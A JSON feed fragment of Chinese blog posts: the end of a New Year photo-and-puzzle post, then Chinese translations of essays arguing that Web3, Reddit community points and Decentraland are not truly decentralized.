src=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/tt.jpg\" alt=\"和 Ralph 在天坛\" width=\"947\" height=\"1500\" class=\"aligncenter size-full wp-image-2524\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/tt.jpg 947w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/tt-189x300.jpg 189w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/tt-646x1024.jpg 646w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/tt-768x1216.jpg 768w\" sizes=\"(max-width: 947px) 100vw, 947px\"></a><br><a href=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/380.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/380.jpg\" alt=\"380!\" width=\"1500\" height=\"874\" class=\"aligncenter size-full wp-image-2517\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/380.jpg 1500w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/380-300x175.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/380-1024x597.jpg 1024w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/380-768x447.jpg 768w\" sizes=\"(max-width: 1500px) 100vw, 1500px\"></a>\n</div>\n<div class=\"set-images-div2\">\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/play2.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/play2.jpg\" alt=\"到处玩.jpg\" width=\"1500\" height=\"1080\" class=\"aligncenter size-full wp-image-2521\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/play2.jpg 1500w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/play2-300x216.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/play2-1024x737.jpg 1024w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/play2-768x553.jpg 768w\" sizes=\"(max-width: 1500px) 100vw, 1500px\"></a><br><a href=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/play.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/play.jpg\" alt=\"还是到处玩.jpg\" width=\"977\" height=\"1500\" class=\"aligncenter size-full wp-image-2520\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/play.jpg 977w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/play-195x300.jpg 195w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/play-667x1024.jpg 667w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/play-768x1179.jpg 768w\" sizes=\"(max-width: 977px) 100vw, 977px\"></a><br><a href=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/stars.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/stars.jpg\" alt=\"380 上的星空\" width=\"1002\" height=\"1500\" class=\"aligncenter size-full wp-image-2522\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/stars.jpg 1002w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/stars-200x300.jpg 200w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/stars-684x1024.jpg 684w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/stars-768x1150.jpg 768w\" sizes=\"(max-width: 1002px) 100vw, 1002px\"></a>\n</div>\n</section><p><span>点击图片查看描述</span></p>\n<p>对了，对于可爱的猫猫们，我整了一个 Telegram 贴纸包，你可以在这里获取：<a href=\"https://telegram.me/addstickers/huanAndDan\">https://telegram.me/addstickers/huanAndDan</a>。</p>\n<h1>跨年红包</h1>\n<p>今年的解题之旅，从下面这张图片开始：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/b.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/b.jpg\" alt=\"\" width=\"1510\" height=\"1250\" class=\"aligncenter size-full wp-image-2556\"></a>\n<p>不过，鉴于今年的题目较以往对于认真解题的人更难，我还准备了隐藏红包，在解题中收集线索即可发现隐藏红包。共有 20 个普通红包和 10 个隐藏红包。</p>\n<p>解题计划持续到东八区 2022.02.03 23:59:59 或红包被领完为止，之后我会发布题解。不过由于去年情况混乱，今年在解题过程中我一旦发现有不正常的现象就会立即停止活动。Anyway，新年快乐！祝玩得开心。</p>\n<h1>跨年海报</h1>\n<p>依然是传统艺能，今年的海报用到了 PS 和 Adobe 家的新玩具 Dimension。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/2022-in-post-1.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/2022-in-post-1.jpg\" alt=\"\" width=\"707\" height=\"1000\" class=\"aligncenter size-full wp-image-2547\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/2022-in-post-1.jpg 1414w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/2022-in-post-1-212x300.jpg 212w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/2022-in-post-1-724x1024.jpg 724w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/2022-in-post-1-768x1086.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/2022-in-post-1-1086x1536.jpg 1086w\" sizes=\"(max-width: 707px) 100vw, 707px\"></a>\n<p>那么祝各位新年快乐！</p>\n","link":"https://flyhigher.top/diary/2507.html"},{"title":"[译] 不，Web3 不是去中心化","date":"2021-12-14 14:01:00","description":"\n<h2>来自译者的楔子</h2>\n<p>加密货币社区对元宇宙和 Web3 的狂热仍在继续，大量投资人和开发者前仆后继加入其中。但是，Web3 真的能实现支持者们的种种愿景吗？亦或是另一个镜中月、水中花？也许让历史照进现实，能给我们答案。<br>这是自 <a href=\"https://blog.skk.moe/post/keep-web-free-say-no-to-web3/\">Web3 系列的引子之后</a>，这个系列的第一篇文章。</p>\n<blockquote><p>原文标题：Web3 is not decentralization<br>原文链接：<a href=\"https://invisibleup.com/articles/38/\">https://invisibleup.com/articles/38/</a><br>原文作者：<a href=\"https://invisibleup.com/\">InvisibleUp</a><br>译者：<a href=\"https://skk.moe/\">Sukka</a>，首发于 <a href=\"https://blog.skk.moe/\">Sukka's Blog</a></p></blockquote>\n<p>不，真的。Web3 并不是去中心化。我觉得这应该很明显。我原本以为我不需要一整篇文章来阐述这个问题，但我想我确实需要。</p>\n<p>令我感到吃惊的是，像 Reddit、Twitter 和 Discord 这样的科技巨头突然决定全力投入到 NFT 中，以达到「去中心化」的目的，尤其是其中 Reddit 的做法令我尤为生气。在 <a href=\"https://www.coindesk.com/markets/2020/05/14/reddit-rolls-out-community-points-on-ethereum-to-incentivize-positive-behavior/\">2020 年 5 月</a>左右，他们在 <code>/r/FortniteBR</code> 和 <code>/r/CryptoCurrency</code> 中实验性的启动了一个「社区代币」系统，虽然我从未去过这两个 Subreddit，但我从一名 <a href=\"https://twitter.com/isyourguy/status/1457220590004158468\">来自 Reddit 的开发者的 Twitter 推文中</a> 得知，他们正在计划将 Reddit 的 Karma Point 转换为这些代币。</p>\n<blockquote><p>译者注：关于 Reddit 将 Karma 转变为 ERC-20 代币系统一事，我曾经在我的 Web3 系列文章与译文中引用过一篇 <a href=\"https://cointelegraph.com/news/reddit-to-reportedly-tokenize-karma-points-and-onboard-500m-new-users\">相关的新闻报道</a></p></blockquote>\n<p>在我列举的三家科技巨头中，Reddit 是走出最远的、愿景最具体的——Twitter 的为用户上传的图片添加 NFT 标签的计划依然停留在纸面上、而 Discord 在其用户的强烈反对下无限期暂停了他们的计划。因此，我在这里主要介绍 Reddit 目前已经公开的计划和路线图。简而言之，Web 1.0 是一个伟大的去中心化前沿阵地、Web 2.0 是一堆有墙的花园、有许多缺点。我完全赞同这个观点。然而，Reddit 正在加入其他公司的 Web3 的行列、准备通过分配基于以太坊的加密货币、赋予网站用户以投票权。</p>\n<p>我之后再分析这句话是什么意思，现在你只要对这句话有点印象就好了。</p>\n<h2>旧互联网上的去中心化</h2>\n<p>让我们复习一下互联网的历史，上个世纪 80 年代、互联网的起源时期。在那个年代，互联网分为两大阵营，来自 MIT、国防部和欧洲原子能研究中心（译者注：Web 之父 蒂姆·博纳斯·李 就是在欧洲原子能研究中心提出了关于互联网、HTTP 的构想）的 ARPANET，和民间的临时性的、自制的调制解调器。</p>\n<p>ARPANET（现代互联网的直接技术先驱）在设计时就明确考虑到了网络层面的冗余和路由的灵活性。如果苏联人的核武器摧毁了重要城市的战略数据中心，只要 A 与 B 两点之间仍然存在数据通路（如微波），那么电子信息就依然可以传输。这个设计也有缺点，文件分享与数据传输（译者注：指 FTP 和 Gopher。FTP 发明于 1971 年，而 HTTP 诞生于 1992 年，此时冷战已经结束、核战争的威胁已经不复存在）仍然需要服务器才能运行，这意味着如果加利福尼亚被外星人攻击了，你就无法访问来自斯坦福大学的文件。但是，诸如电子邮件、IRC、尤其是 Usenet 等协议的发展，确保了互联网上从服务器到服务器传输信息的能力、从而在整个网络上创造了一个单一的信息来源。</p>\n<p>抛开美国国防部的 ARPANET，有抱负的黑客和公司正在忙于创建公告板系统。一般的，他们会在自己的电脑上运行一个程序，其他的电脑可以通过调制解调器连接，在两台电脑之间实现了一个一对一的直接连接。但是，为了和不止一台电脑连接，你需要挂断一个电话、断开与前一台计算机的链接，然后拨打下一个号码。受限于调制解调器，只有最重要的信息会被下载，导致了孤岛的诞生，如同 Web3 支持者批判的 Web 2.0 孤岛一样。</p>\n<p>为了解决这个问题，人们设计了一些变通方法，其中一个例子就是 UUCP（译者注：BSD-based 的操作系统如 FreeBSD 和 macOS，依然保留了 UUCP 的二进制，你可以在终端中输入 <code>uucp</code> 试试），实现了从 Unix 服务器到 Unix 服务器的信息拷贝。通过登录到一个连接到一系列对等服务器的公共Unix服务器，你可以手动输入一个信息的路径，以到达一个特定的服务器或用户。早期版本的路径使用的地址类似于 <code>www-skk!sukka!moe</code>。自然而然的，随着互联网的发展，这种方法就被淘汰了。</p>\n<blockquote><p>译者注：关于 UUCP 和「一个信息的路径」的更多细节，你可以阅读我的博客上的另一篇译文 <a href=\"https://blog.skk.moe/post/history-of-url/\">URL 的历史</a>，这篇文章详细介绍了互联网和 URL 的变迁历史。</p></blockquote>\n<p>另一种方法是 FidoNet，在民间的 BBS 运营者中非常受欢迎。这是一个允许 BBS 与其他系统同步信息和数据的协议，能够将长途漫游电话费卸载到同一地区内的区间中。</p>\n<p>所有这些早期的交换协议使得互联网根本不存在中心。随着时间的推移，BBS 逐渐被 ISP 替代——ISP 允许你访问其他城市甚至国家的网络、将电子邮件发送到千里之外。其中一些 ISP 很快就发展成为了 ICP，如 AOL（美国在线）和雅虎的 GeoCites（前身为 贝弗利山互联网）。最终，围墙式花园的做法逐渐消失了，IETF 小组成立并开始制定关于互联网的公开规范标准，而 ISP 们则专注于维护和改进宽带基础设施（如建设数据中心、铺设跨洋光纤和骨干网）。</p>\n<h3>案例分析：Usenet</h3>\n<p>你可以把 Usenet 视为 Reddit 的前辈。因为它是一个拥有各种「不同新闻小组」的社区。虽然 Usenet 设计之初时的用途是在互联网上提供新闻，但是它很快被用于各种你能想到的话题。后来，Usenet 成为了传播盗版电影、软件和儿童色情的地下方法（是的，你依然可以通过类似 eternal september 这样的软件访问 Usenet）。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.6.2/usenet.png\" alt=\"usenet.png\" width=\"800\" height=\"600\"></p>\n<p>作为一个非常、非常简化的模型，你发送的信息会像电子邮件一样被发送到新闻组服务器，在那里它们会被发布给全世界的人看。你可以回复线程中的其他信息，或者直接向帖子的作者发送电子邮件。评论将以树状视图展开，与 Reddit 的评论系统非常相似。新闻组服务器可以选择托管某些新闻组，并定期与网络的其他部分同步，以保持所有内容的更新。Usenet 信息也可以与现有的 FidoNet 系统进行交换。在我看来，这在当时是一个设计得非常好的系统。</p>\n<p>不过，最大的问题是缺乏良好的管理控制。Usenet 上的大多数新闻组都是无节制的，这在 Spammer 和其他的什么人开始破坏空间的不成文规则之前、是完全没有问题的。由于 Usenet 固有的分散性质，追溯性地删除信息的工具是有限的。系统版主可以发送取消信息，这个过程可以由 <a href=\"https://en.wikipedia.org/wiki/Cancelbot\">取消机器人</a> 自动完成。这在当时被认为是有争议的，因为它被认为是侵犯了言论自由权。另一种方法是有节制的新闻组，即信息首先被送到新闻组管理员那里进行审批。</p>\n<p>由于大型二进制文件的泛滥，导致互联网服务供应商被迫拔线，再加上有太多的垃圾邮件无法正确应对，Usenet 基本上消亡了。作为回应，世界范围内高度规范的留言板和博客开始大量涌现，最终互联网巨头和大型网站诞生了，如 4chan、Reddit、Facebook 和 Twitter。</p>\n<h3>案例分析：IRC</h3>\n<p>IRC、即 Internet Relay Chat，是 20 世纪 80 年代末设计的一种即时通讯协议。最初，它被设计成每个用户都在同一个网络上，但不久之后，社区中的分裂导致了几个竞争性网络的产生，如 FreeNode（现在的 Libera Chat）、EFnet 和 IRCnet。较小的网络，如 tilde.chat 也存在。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.6.2/irc.png\" alt=\"irc.png\" width=\"800\" height=\"600\"></p>\n<p>IRC 也是一个分布式系统，在这个意义上，同一 IRC 网络中的多个服务器可以同步并主持相同的频道，并在服务器之间转发信息。你只需连接到离你最近的服务器，后端就会适当地转发信息。你几乎可以使用任何客户端来连接，因为与今天复杂的专有的协议相比，IRC 是一个简单而开放的协议。根据需要，附加机器人或「弹跳器」（机器人会保存信息供以后查看，因为 IRC 不支持查看历史信息）是很容易的，因为它们只不过是专门编程的客户端。</p>\n<p>IRC（通常）只能发送文本信息，没有很好的用户注册、信息回滚机制，也没有 MSN、Slack、Matrix 或 Discord 等较新的聊天应用程序的几乎任何其他功能。2003 年，随着更有说服力的替代品的出现，它开始衰退，但是它仍然被广泛用于开源技术社区和服务的后端。</p>\n<h3>案例分析：IPFS</h3>\n<p>IPFS（星际文件系统）是一个典型的现代分散协议的例子。它解决了文档和文件只有一个真实来源的问题，让任何人都可以托管一个文件的副本以提供网络冗余。</p>\n<p>IPFS 的工作方式有点笨拙，基本上是使用文件的哈希值作为其永久地址。有一些方法可以解决这个问题，比如 <a href=\"https://docs.ipfs.io/concepts/ipns/\">IPNS</a> 与 <a href=\"https://docs.ipfs.io/concepts/dnslink/\">DNSLink</a> 的结合，它给 DNS 条目提供了一个静态地址，可以引用位于 IPFS 上的任何文件。</p>\n<p>......这一节很短，因为没有太多的东西可以写。IPFS 主要负责文件。<a href=\"https://neocities.org/\">Neocities 有对它的支持</a>。然后是，与大部分人想象中的完全相反，绝大多数 NFT 艺术品其实都托管在 IPFS 上面。唯一真正的问题是，IPFS 上的文件并不是永久存在的。一个文件可能会在未来失踪，因为没有其余的主机没有这个文件的副本（如同 BitTorrent 无人做种一样），但这并不是一个真正可以现实地解决的问题。而它其实工作地相当好。</p>\n<h3>中场休息：言论自由和言论审查</h3>\n<p>让任何人能够主持任何事情的一个自然后果是——「他们可以主持任何事情」。你同意的东西，你不同意的东西，你认为绝对不道德的东西。我个人主张 「<a href=\"https://en.wikipedia.org/wiki/Paradox_of_tolerance\">宽容的悖论</a>」，主张伤害的声音应该被踢到路边。而令人惊讶的是，去中心化系统的人做到了这一点——如果一个网络上的某个特定群体相当有毒，社区可以简单地分叉，排除他们，并继续下去，有效地将不良行为者隔离在一个回声室中。Mastodon 的服务器屏蔽系统已经表明这是一个相当有效的解决方案，最近 FreeNode 的自我毁灭和与用户纷纷迁移到 Libera Chat 更是完美体现了这一点。</p>\n<p>当然，这也不是万无一失的。Parler 和 Kiwi Farms 是被排斥的社区的例子，它们仍然在做明显的伤害，比如延续导致 1 月 6 日袭击的阴谋论，或者<a href=\"https://en.wikipedia.org/wiki/Kiwi_Farms#Suicides_of_harassment_targets\">由于不断的骚扰而导致许多人自杀</a>。Kiwi Farms 勉强维持着与外部互联网的连接，因为他们的 DNS 和 DDoS 保护完全由 Cloudflare（唯一剩下的愿意与他们合作的公司）提供，他们的服务器托管全部由「1776 Solutions」内部完成，该 ISP 对外只能通过一条 Transit 连接。</p>\n<blockquote><p>译者注：在 Cloudflare 清退 8chan、Voxility 将向 8chan 敞开怀抱的 Epik, Inc. 和 BitMitigate 拔线后，8chan 最终也被托管到由 1776 Solutions（AS397702）提供的服务器。如果作为本文的读者你也是一名 ISP 从业者，我在这里倡议你在你的网络中为任何通往 AS397702 的路由设置黑洞。</p></blockquote>\n<p>归根结底，我们试图用技术解决社会文化问题，这几乎是不可能的。真正的解决方案是让人们不要成为可怕的偏执者，而我对如何实现这一点没有丝毫头绪。</p>\n<h2>Web3 的「去中心化」概念</h2>\n<p>在过去的 3600 字中，我已经花了太多的时间去研究 20-40 年前的协议。是时候让我们回到现代了。在新兴的加密货币领域，存在着「DAO」的概念，即去中心化的自治组织。<a href=\"https://ethereum.org/en/dao/\">Ethereum.org</a> 将其描述为「像一个互联网原生企业，由其成员集体拥有和管理」。从表面上看，这听起来很像共产主义、或是苏联的「农村合作社」运动。</p>\n<p>以太坊作为一种加密货币，主要存在于以太坊虚拟机上执行代码。这是一个非常奇怪的架构（基于堆栈，1024 深度，256 位比特），其状态在全球每个以太坊矿工之间共享，其输入和输出是代币，要么是可替代的（如以太坊货币），要么是不可替代的。</p>\n<p>通过智能合约在区块链上永久存储硬规则的组织，你可以在项目上花费任何货币之前强制要求投票。所说的投票（以及代码和资金和其他一切）将是完全透明的，而且组成 DAO 的智能合约将是不可改变的。</p>\n<p>虽然我可以讨论智能合约的优点，但是不可忽视的就是他们的陷阱。例如，最大的 DAO —— <a href=\"https://en.wikipedia.org/wiki/The_DAO_(organization)\">The DAO</a>，在上线伊始就因为代码 Bug 而被黑客攻击、所有的资金全部化为乌有，以太坊网络被迫硬分叉来保护投资者的合约。当然，相比继续讨论 DAO 的失败案例，我们还是讨论一下这些实践是如何运作的吧。</p>\n<h3>案例分析：Reddit 社区代币</h3>\n<p>让我们把这一切带回我们开始的地方：Web3 的趋势与互联网上的社交媒体巨头。正如我之前所说，Reddit 是最有兴趣加入 DAO 并开始称自己为 「去中心化」的网站，所以我们将从那里开始。</p>\n<p>这里要做的明显比较是，Reddit 是一个类似于 Usenet 的中心化网站。Reddit 承载着 Subreddit，并提供审核工具，既包括 Upvote / Downvote 的形式，也包括实际的版主形式。在 Reddit 上，严格禁止操纵 Upvote / Downvote 的行为，网站管理员使用自动化工具禁止任何人这样做。这为子版块的社区创造了一种决定哪些内容是最好的方式，并将这些优质内容推广到前面，无论他们是一个偶然的潜水者还是一个活跃的成员发表的。这是 Reddit 运作的基础，到目前为止，它运作得相当好。</p>\n<p>随着社区积分的引入，Reddit 声称他们允许会员「拥有他们喜欢的社区的一部分」，就像股东拥有他们喜欢的公司的一部分一样。积分是衡量声誉的一个标准，是用于投票或福利的货币，如徽章、表情符号、GIF 等，以炫耀你的财富。投票是不具约束力的公投，采用一人一票和每点一票的方式计算。在投票过程中，积分不会被消耗。每隔四周，Reddit 网站会公布每个用户的名单，他们获得了多少 Karma，以及他们将获得多少积分作为补偿。对这个名单的修改可以用积分投票的方法提出。</p>\n<p>这里应该很明显的一点是，这根本就不是去中心化。因为你甚至不能在 Reddit 的系统中投票选举新版主。当然，你也不能建立属于你自己的 Subreddit，并在那里建立一个社区；或者从 Reddit 主网络中分叉出来，创建一套新的独立子版块；或者规避 Reddit 网站管理员的意愿；或者逃避 Reddit 是一个需要盈利的企业的事实、而让用户购买假的互联网积分、并让用户产生自己拥有控制的错觉。</p>\n<h3>案例分析：Decentraland</h3>\n<p><img src=\"https://npm.elemecdn.com/sks@0.6.2/decentraland.jpg\" alt=\"decentraland.png\" width=\"1207\" height=\"682\"></p>\n<p>抛开 Reddit，现在让我们请出 <a href=\"https://decentraland.org/\">Decentraland</a>。这是一个用于创建虚拟世界的 DAO，这个概念如今也被称为「元宇宙」。</p>\n<p>Decentraland 允许用户对 Decentraland 生态系统内的各种政策和变量进行投票，例如增加新的可穿戴设备，对某些项目的拨款，市场费用，允许使用的基础设施等。还存在一个安全顾问委员会、有权力扔掉现有的合约、改用修复了漏洞的合约。<a href=\"https://governance.decentraland.org/\">你可以在这里查看这些提案的一些例子</a>。一个特别有趣的是这个拨款提案，<a href=\"https://governance.decentraland.org/proposal/?id=47e1bb80-4139-11ec-be0c-afec86cba5e5\">以增加对一个被称为 IPSME 的元宇宙协议的支持</a>，这是我想改天进一步调查的事情。</p>\n<p>Decentraland 从根本上说是在一个被称为 MANA 的可替换代币上运行的，它被用于所有系统内的交易。虽然投票是使用 <a href=\"https://docs.snapshot.org/\">Snapshot</a> 进行的，没有交易费用（Gas），<a href=\"https://docs.decentraland.org/decentraland/what-do-you-need-to-participate/\">但你的投票权是由你拥有的游戏中的货币数量加权的</a>。这（在理论上）<strong>使已建立的富裕用户比新建立的贫穷账户更重要</strong>，使用的系统非常类似于标准加密货币中的股权证明工作。</p>\n<p>虽然我不能证明 Decentraland 遵循了这一点，但 DAO 中一个常见的投票结构是「<a href=\"https://en.wikipedia.org/wiki/Quadratic_voting\">平方投票法</a>」。这是为了判断一个人的偏好程度，而不是单纯的二元 是 / 否。通过对每一票收取幂等的货币 / 代币 / 金钱 / 等等(例如：1 票 = 1 美元，2 票 = 4 美元，3 票 = 8 美元，等等）。<strong>如果每个被投票的人都有一个固定的、一致的点数来分配给投票，那么这个方法就相当好，但如果把它与货币联系起来，你就会产生大量的问题。</strong></p>\n<p>举例说明，穷人只有更少的货币来表达他们的偏好。虽然一个穷人为了实现他们的诉求，愿意牺牲自己所有的一切，但是他们很容易就被一个有着相反偏好的富人所推翻。请看，非洲贫困国家缺乏公共交通、缺乏无障碍辅助设备、缺乏药物、缺乏纯净的饮用水和健康的食品供应。当地人并不是不需要这些东西，只是因为在富人们眼中，这些穷人的生活不值得被改善。 在美国，许多非白人的贫困社区因为「城市更新」政策被迫拆除、土地被用于修建高速公路，就是一个典型的例子。</p>\n<p>还有一个问题是，整个系统的模式是通过人为的稀缺性来获利。在 Decentraland 上的一票、一块土地、一件衣服或什么的，<strong>只是一系列的比特和字节，完全可以被自由复制或扩展</strong>。我特别厌恶 NFT 的主要原因是我对人工稀缺性的概念的厌恶，这种东西在 NFT 发明之前就已经困扰着数字世界，强硬的知识产权法充其量只是将大量的流行文化束缚在地下粉丝艺术家手中。我们的经济体系认为，自然和人类的创造物不是给世界的礼物，要负责任地和可持续地使用，而是作为资源被开发到其极限。自然，开发自然资源和荒谬的能源需求，仅仅是为了加强互联网上的物品的价值，这将是最终的结局，因为对我们来说，唯一重要的事情似乎是我们是否能从我们得到的礼物中产生投资回报。</p>\n<p>值得注意的是，我并非反对艺术家，出版社，版权委托书。我认为艺术印刷品在 Ko-Fi、Pateron 上付费是对创作伟大内容的回报，而不是一种贪婪地攫取金钱、希望从中获利的手段。<strong>NFT 正是因为无视艺术是情感的表达、是付诸了爱的劳动的概念，倾向于大规模生产垃圾赚快钱</strong>，才被我鄙视的。</p>\n<p>很明显，Decentraland 没有规定杜绝这种理念，除非硬分叉源代码，不做 Decentraland。如果  DAO 不能从平台上的交易费中获得足够的投资回报来继续运营，Decentraland 服务器本身也完全有可能倒闭。当然，<strong>所有的投票将主要由那些已经从 Decentraland 的方式中获益最多的人决定，他们对公平的竞争环境兴趣不大，而更愿意投票给那些给他们带来更多财富的东西，创造一个非常不平等和不公平的虚拟社会</strong>。</p>\n<p>我的最终结论是，Decentraland 是一个非常有趣的平台，<strong>但它有固有的等级制度，来自早期主要参与者积累的财富。</strong>从本质上讲，它和 Reddit 一样是一个单一的网站，拥有最多的代币的人就如 Reddit 的管理员和版主一样、凌驾于其他普通用户之上。如果 Decentraland 不使用区块链、将数据完全存储在 Decentraland 中心化的服务器上，或使用 Steam 钱包余额而不是 ERC-20 作为代币，以及通过纸质合同和法务部来执行公司内部的拨款，<strong>那么这个中心化的系统和现有的在区块链上运行的系统本质上仍然是完全相同的</strong>。如果 Decentraland 的服务器瘫痪，Decentraland 上的任何东西都没有价值；在它的生态之外，Decentraland 的任何东西也没有任何价值。简单地说，我不能真诚地称其拥有丝毫的去中心化。</p>\n<div class=\"license\">\n<div>[译] 不，Web3 不是去中心化</div>\n<div><a href=\"https://blog.skk.moe/post/web3-is-not-decentralization/\">https://blog.skk.moe/post/web3-is-not-decentralization/</a></div>\n<div>            <div>              <div>本文作者</div>\n<div>Sukka</div>\n</div>\n<div>              <div>发布于</div>\n<div>2021-12-14</div>\n</div>\n<div>              <div>许可协议</div>\n<div><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/web3-is-not-decentralization/"},{"title":"[译] 捍卫自由的互联网，对 Web3 说不","date":"2021-12-12 13:40:00","description":"\n<h2>来自译者的楔子</h2>\n<p>作为一个充满泡沫和噱头的新概念，Web3 和元宇宙在区块链的社区中掀起了一波浪潮。鼓吹者坚信 Web3 就是互联网的未来、不惜砸下大把的金钱和精力、希望能在未来中捞一杯羹；而大部分人保持观望的态度。是时候来一点 Web3 的反对意见了。</p>\n<p>这篇译文将会作为我驳斥 Web3 的引子。在新的一年里，我会继续撰写评论文章、翻译来自区块链社区的观点，揭露 Web3 的谎言、戳破元宇宙的泡沫。</p>\n<blockquote><p>原文标题：Keep the web <strong>free</strong>, say <strong>no</strong> to <strong>Web3</strong><br>原文链接：<a href=\"https://yesterweb.org/no-to-web3/index.html\">https://yesterweb.org/no-to-web3/index.html</a><br>原文作者：<a href=\"https://yesterweb.org/\">Yesterday Web</a><br>译者：<a href=\"https://skk.moe/\">Sukka</a></p></blockquote>\n<p>Web3 被支持者称为一个想法、一个运动、新一代的互联网。</p>\n<p>Web3 被视为互联网的「未来」。这个概念由 <a href=\"https://www.sfchronicle.com/tech/article/Crypto-has-a-bro-problem-Women-in-the-field-say-16336453.php\">一群加密货币狂热者</a> 提出，基于现有的公共区块链。</p>\n<h2>Web3 声称其由社区管理</h2>\n<blockquote><p>虽然一个穷人为了实现他们的诉求，愿意牺牲自己所有的一切，但是他们很容易就被一个有着相反偏好的富人所推翻。请看，非洲贫困国家缺乏公共交通、缺乏无障碍辅助设备、缺乏药物、缺乏纯净的饮用水和健康的食品供应。当地人并不是不需要这些东西，只是因为在富人们眼中，这些穷人的生活不值得被改善。</p></blockquote>\n<p>许多 Web3 社区和加密货币有关社区都使用「<a href=\"https://en.wikipedia.org/wiki/Quadratic_voting\">平方投票法</a>」，即允许参与者表达他们对一个观点的偏好程度、而不是简单的「赞成」与「反对」。但是不幸的是，「你喜欢这个吗？」已经变成了「用你的钱告诉我，你有多喜欢这个」。换句话说，在决定 Web3 走向的道路中，参与者可以通过撒币来表达他们的诉求。</p>\n<p>InvisibleUp 的文章「<a href=\"https://invisibleup.com/articles/38/\">不，Web3 不是去中心化</a>」详细而有力地阐述了这个观点。</p>\n<h2>Web3 声称其是去中心化的</h2>\n<p>去中心化肯定是好事，但是加密货币和区块链绝对不是去中心化的唯一实现。请见 Soatok 发表在 Dhole Moments 上的文章「<a href=\"https://soatok.blog/2021/10/19/against-web3-and-faux-decentralization/\">Against Web3 and Faux-Decentralization</a>」。</p>\n<p>非常凑巧的是，Web3 的许多关键的「去中心化」基础设施都运行在由互联网巨头亚马逊提供的 中心化云计算服务 AWS 上（参见来自英国伍尔弗汉普顿大学的经济学家、数字货币投资者 Shaurya Malwa 发表的文章 「<a href=\"https://decrypt.co/44321/70-of-ethereum-nodes-are-hosted-on-centralized-services\">70% of Ethereum Nodes Are Hosted on Centralized Services</a>」），并且由「内幕人士」而非广大社区负责运营（参见区块链研究者、数字货币投资者 David Canellis 于 2019 年就以太坊硬分叉发表的评论文章「<a href=\"https://thenextweb.com/news/ethereum-insiders-fire-back-nodes\">Ethereum insiders deny there’s only one computer keeping a copy of its blockchain</a>」）。</p>\n<h2>Web3 声称要消除互联网的「中间人」</h2>\n<blockquote><p>想象一下，在 Web3 的倡议和提案中，用户将会真正拥有他们的数据。哇！那为什么像 Twitter 和 Facebook 的互联网巨头会允许有人破局呢？他们正在嫌赚的钱不够多呢！<br>—— Auzzie Jay。</p></blockquote>\n<p>Web3 的支持者缄口不谈他们将会如何消除被称为「中间人，Man in the Middle」的互联网巨头。不过，你如果想一下的话，他们刚刚好铲除了一个互联网巨头——Facebook，毕竟他们已经改名「元（Meta）」了，嗯。</p>\n<h2>Web3 声称要彻底杜绝数据泄露</h2>\n<p>不知道命运是否充满了讽刺，以太坊自己就因为数据泄露而损失了 5500 万美元（参见美国彭博社记者 Matthew Leising 出版的书籍「Out of the Ether: The Amazing Story of Ethereum and the $55 Million Heist That Almost Destroyed It All」、<a href=\"https://www.coindesk.com/tech/2020/09/17/the-55m-hack-that-almost-brought-ethereum-down/\">详细介绍了以太坊的历史、以及以太坊损失 5500 万美元的前后故事</a>）。</p>\n<p>Insider Inc. 签约作者 Carla Mozée 在四个月前（译者注：即 2021 年 8 月 31 日）发表了一篇文章「<a href=\"https://markets.businessinsider.com/news/currencies/cryptocurrency-hacks-fraud-cases-record-bitcoin-ethereum-wallets-breaches-defi-2021-8\">Cryptocurrency hacks and fraud are on track for a record number of incidents in 2021, data shows</a>」，详细介绍了过去八个月里发生的有关加密货币的非法集资、诈骗、黑客攻击事件、以及造成的损失。</p>\n<h2>Web3 声称要解决「双重开支」问题</h2>\n<blockquote><p>译者注：你可以把「双重开支」想象为开出的支票被复制，导致同一笔消费让你的账户被反复扣款。加密货币的 51% 攻击就是一个典型的「双重开支」问题。</p></blockquote>\n<p>加密货币并不能阻止「双重开支」问题，以至于社区为此发明了一个名词「51% 